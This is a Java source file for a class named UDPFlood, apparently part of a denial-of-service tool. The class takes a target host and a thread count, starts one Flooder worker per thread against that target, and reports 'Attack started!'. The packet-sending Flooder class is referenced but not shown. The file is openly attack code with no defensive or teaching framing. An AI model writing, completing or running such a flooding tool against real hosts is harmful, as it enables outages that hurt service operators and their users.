/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ignis.v;

import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author henrypitcairn
 */
public class UDPFlood {
    private int threads;
    private boolean running;
    private int packetsSent;
    private int bytesSent;
    private String target;
    private ArrayList<Flooder> flooders;
    public UDPFlood(String target, int threads) {
        this.target = target;
        this.threads = threads;
        //flooders = new ArrayList<>();
    }
    public UDPFlood() {
        flooders = new ArrayList<>();
    }
    public void setTarget(String target) {
        this.target = target;
    }
    public void setThreads(int threads) {
        this.threads = threads;
    }
    public boolean isRunning() {
        return running;
    }
    public void start() {
        flooders = new ArrayList<>();
        System.out.println("Startiing up with "+threads+" threads. . .");
        running = true;
        System.out.println("Starting attack. . .");
        for (int i=0; i<threads; i++) {
            try {
                flooders.add(new Flooder(target));
            } catch (    UnknownHostException | SocketException ex) {
                System.out.println(ex);
                Logger.getLogger(UDPFlood.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
        for (Flooder flooder : flooders) {
            flooder.start();
        }
        System.out.println("Attack started!");
    }
    public void stop() {
        System.out.println("Stopping attack. . .");
        for (Flooder flooder : flooders) {
            flooder.stop();
        }
        running = false;
    }
}
